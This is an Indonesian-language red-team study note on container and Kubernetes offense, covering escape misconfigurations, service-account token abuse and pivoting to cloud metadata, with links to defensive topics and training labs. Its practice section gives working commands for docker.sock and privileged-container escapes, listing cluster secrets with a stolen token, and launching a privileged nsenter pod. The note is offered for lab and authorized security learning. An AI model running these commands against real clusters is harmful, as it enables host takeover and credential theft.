# 🐳 Container & Kubernetes Offense

> [!summary] Ringkasan
> Aplikasi modern berjalan dalam **container** (Docker) yang diorkestrasi oleh **Kubernetes (K8s)**. Note ini membahas cara penyerang **keluar dari container** (*container escape*) untuk menguasai mesin host, lalu menyalahgunakan komponen K8s (service account token, RBAC longgar, kubelet, etcd) untuk mengambil alih seluruh cluster — dan dari sana melompat ke kredensial cloud. Ini pendalaman target dari [[Cloud Security (AWS-Azure-GCP)]].

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Linux Dasar untuk Security]], [[Privilege Escalation]], [[Cloud Security (AWS-Azure-GCP)]]

---

> [!danger] Etika & lingkup
> Hanya pada cluster milik sendiri / lab (kube-goat, minikube, KinD) atau engagement berizin. Menguasai node K8s berarti menguasai semua aplikasi di atasnya — dampaknya besar. Memetakan ke **MITRE ATT&CK for Containers**.

## 🧠 Konsep Inti

### Container itu bukan VM
Container hanyalah **proses biasa di host** yang diisolasi dengan fitur kernel Linux: **namespaces** (isolasi pandangan: PID, mount, network), **cgroups** (batas resource), dan **capabilities** (pecahan hak root). Karena berbagi **kernel yang sama** dengan host, salah konfigurasi isolasi = jalan kabur ke host. Bandingkan dengan isolasi VM penuh di [[Setup Lab (Virtualisasi)]].

### Container escape — penyebab tersering
| Misconfig | Kenapa berbahaya |
|---|---|
| `--privileged` | container dapat hampir semua capability + akses device host → mount disk host, escape mudah |
| Mount `docker.sock` | bisa perintah Docker daemon host → buat container baru yang mount `/` host |
| `hostPath` volume / mount `/` | langsung baca-tulis filesystem host |
| `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE` | capability berbahaya → mount, akses proses host |
| `hostPID` / `hostNetwork` | lihat proses & jaringan host langsung |
| Kernel/runtime rentan | mis. **runc CVE-2019-5736**, **CVE-2024-21626** (Leaky Vessels) → overwrite runc dari dalam container |

### Kubernetes — anatomi serang
- **Service Account (SA) token** — tiap pod biasanya punya token JWT di `/var/run/secrets/kubernetes.io/...`. Token over-privileged = kunci cluster.
- **RBAC** — cek hak dengan `kubectl auth can-i`. `create pods`, `get secrets`, `pods/exec` adalah hak berbahaya.
- **kubelet (port 10250)** — API tiap node; jika tanpa auth → jalankan perintah di pod mana pun.
- **etcd (2379)** — database cluster; isinya semua secret (sering base64, bukan terenkripsi).
- **API server (6443)** — otak cluster.

### Jalur serangan khas (rantai)
```text
[pod ter-exploit] → curi SA token → enum RBAC (can-i) → buat pod privileged /
mount hostPath → escape ke NODE → baca kredensial kubelet/cloud →
metadata cloud (169.254.169.254) → IAM cloud → seluruh akun cloud
```
Ini menyambung langsung ke metadata abuse di [[Web Exploitation Lanjutan]] (SSRF) & [[Cloud Security (AWS-Azure-GCP)]].

## ⚙️ Praktik

```bash
# --- Cek "aku di dalam container?" & seberapa istimewa ---
amicontained                      # capabilities, namespaces, seccomp
cat /proc/1/cgroup                # tanda docker/kubepods
capsh --print

# --- Escape via docker.sock (jika ter-mount) ---
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host sh

# --- Escape via privileged: mount disk host ---
fdisk -l                          # cari /dev/sda1
mkdir /hostfs && mount /dev/sda1 /hostfs && chroot /hostfs

# --- Kubernetes: pakai SA token ---
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
kubectl --token=$TOKEN auth can-i --list           # apa yang boleh?
kubectl --token=$TOKEN get secrets -A              # kalau boleh: jackpot

# --- Buat pod jahat yang mount root node (kalau bisa create pod) ---
kubectl run evil --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}' -it
```

## 🧰 Tools

- **kube-hunter** — pemindai kelemahan cluster (Aqua).
- **kubescape / kube-bench** — audit postur (CIS K8s Benchmark).
- **peirates** — eskalasi & pivot di dalam K8s (otomatis).
- **amicontained** — deteksi kemampuan container saat ini.
- **kdigger / deepce** — enumerasi escape Docker/K8s.
- **trufflehog** — cari secret di image/env.

## 🔗 Kaitan

- Domain induk: [[Cloud Security (AWS-Azure-GCP)]] (escape node → metadata → IAM).
- Privesc di host setelah escape: [[Linux Privilege Escalation Lanjutan]].
- SSRF → metadata sebagai pintu awal: [[Web Exploitation Lanjutan]].
- Pivot antar pod/service: [[Pivoting & Tunneling Lanjutan]] · [[Post-Exploitation & Pivoting]].
- **Sisi Blue ↔** [[Cloud Detection & Response]] (deteksi pod anomali, audit log K8s), [[Hardening & Vulnerability Management]] (Pod Security Standards, RBAC least-priv, seccomp/AppArmor).

## 🎯 Latihan

- **kube-goat** (Bust-a-Kube) & **kubernetes-goat** — cluster sengaja rentan, skenario escape lengkap.
- Pasang **minikube/KinD** lokal, buat pod `privileged`, latih escape ke node.
- **TryHackMe — "Bypassing Kubernetes"**, **PortSwigger** belum punya; pakai **HackTricks Cloud**.

## 📖 Sumber

- **HackTricks Cloud — Kubernetes & Docker** — https://cloud.hacktricks.xyz
- **MITRE ATT&CK for Containers** — https://attack.mitre.org/matrices/enterprise/containers/
- **NCC Group — Container security whitepapers**; **Leaky Vessels (Snyk) advisory**.
- **CIS Kubernetes Benchmark**.
